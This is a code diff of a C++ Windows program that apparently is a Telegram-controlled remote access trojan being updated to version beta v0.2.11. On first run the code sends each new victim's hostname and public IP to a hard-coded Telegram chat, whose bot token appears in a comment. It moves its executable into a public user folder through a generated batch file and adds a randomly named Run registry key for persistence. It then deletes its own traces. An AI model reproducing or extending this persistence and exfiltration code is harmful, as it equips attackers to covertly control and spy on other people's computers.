@@ -3,13 +3,14 @@
 string ID;
 const string BOT_API = ""; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
 const string CHAT_ID = "-1001655582641";
-const string VERSION = "beta v0.2.10";
+const string VERSION = "beta v0.2.11";
+const string PATH = "$sysdisk$/Users/Public"; //you can use $sysdisk$ and $username$
 
 inline bool filexits(const string& name) {
     struct stat buffer;
     return (stat(name.c_str(), &buffer) == 0);
 }
-string uptime(); string get_exe(); string hostname(); string public_ip(); string admin_rights(); string Cursor_Position();
+
 const vector <pair<string, string(*)()>> constants = { {"$UPTIME$",uptime},{"$EXE_NAME$",get_exe},{"$HOST_NAME$",hostname},{"$PUBLIC_IP$",public_ip},{"$ADIMN_RIGHTS$",admin_rights},{"$CURSOR_POSITION$",Cursor_Position} };
 void Send(string);
 
@@ -172,7 +173,7 @@ string url_encode(const string& value) {
 
 void Send(string to_send) {
     while (!to_send.empty()) {
-        cpr::Response r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + BOT_API + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + url_encode(to_send.substr(0,4095)) });
+        cpr::Response r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + BOT_API + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + url_encode(to_send.substr(0,TELEGRAM_MAX)) });
         to_send.erase(0, 4095);
     }
 }
@@ -369,26 +370,42 @@ string random_string(int lenght) {
     return random;
 }
 
-void autostart() {
-    string path;
-    char username[256 + 1];
-    DWORD username_len = 256 + 1;
-    GetUserName(username, &username_len);
-
+char GetSysDiskLetter() {
     char letter[256 + 1];
     GetSystemDirectory(letter, sizeof(letter));
+    return letter[0];
+}
 
-    path = letter[0];
-    path += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp";
+string get_username() {
+    string username = exec("echo %username%");
+    return username.substr(0, username.size() - 1);
+}
+
+void autostart() {
+    string path = PATH;
+    int find = path.find("$sysdisk$");
+    if (find != string::npos) {
+        string npath;
+        npath = GetSysDiskLetter();
+        npath += ":"+ path.substr(find + string("$sysdisk$").size(), path.size());
+        path = npath;
+    }
+
+    find = path.find("$username$");
+    if (find != string::npos) {
+        path.erase(find, string("$username$").size());
+        path.insert(find, get_username());
+    }
+
     if (!filexits(path + "\\" + get_exe())) {
         Send("New user\nUsername: " + hostname() + "\nip: " + public_ip());
 
         fstream file;
         file.open("o.bat", ios::out);
         file << "TASKKILL /F /IM " << get_exe() << endl
-            << "move " << get_exe() << " %temp%" << endl
-            << "move " << "shitoo" << " %temp%" << endl
-            << "start %temp%\\" + get_exe() << endl
+            << "move " << get_exe() << +" " + path << endl
+            << "move " << "shitoo " << path << endl
+            << "start " + path + "/" + get_exe() << endl
             << "exit";
         file.close();
 
@@ -396,16 +413,11 @@ void autostart() {
         string s = "reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f " + get_exe();
         if (exec(s.c_str()).find("End of search: 0 match(es) found.") != string::npos) {
             cout << "Adding new key for autostart\n";
-            string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + random_string(16) + " /t REG_SZ /d %temp%\\" + get_exe();
+            string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + random_string(16) + " /t REG_SZ /d " + path + "\\" + get_exe();
             system(cmd.c_str());
         }
-
-        char buffer[MAX_PATH];
-        ::GetModuleFileNameA(NULL, buffer, MAX_PATH);
-        string buff2(buffer);
-        buff2.erase(buff2.size() - get_exe().size(), 256);
         file.open("shitoo", ios::out);
-        file << buff2 + "o.bat";
+        file << get_path() + "o.bat";
         file.close();
         system("start /min o.bat");
     }
@@ -413,12 +425,11 @@ void autostart() {
         fstream file;
         string path2;
         file.open(path + "\\shitoo", ios::in);
-        file >> path2;
+        getline(file, path2);
         file.close();
 
-        string cmd = "del " + path2;
-        system("del %temp%\\shitoo");
-        system(cmd.c_str());
+        system(string("del \"" + path + "\\" + "shitoo\"").c_str());
+        system(string("del \"" + path2 + "\"").c_str());
     }
 }
 
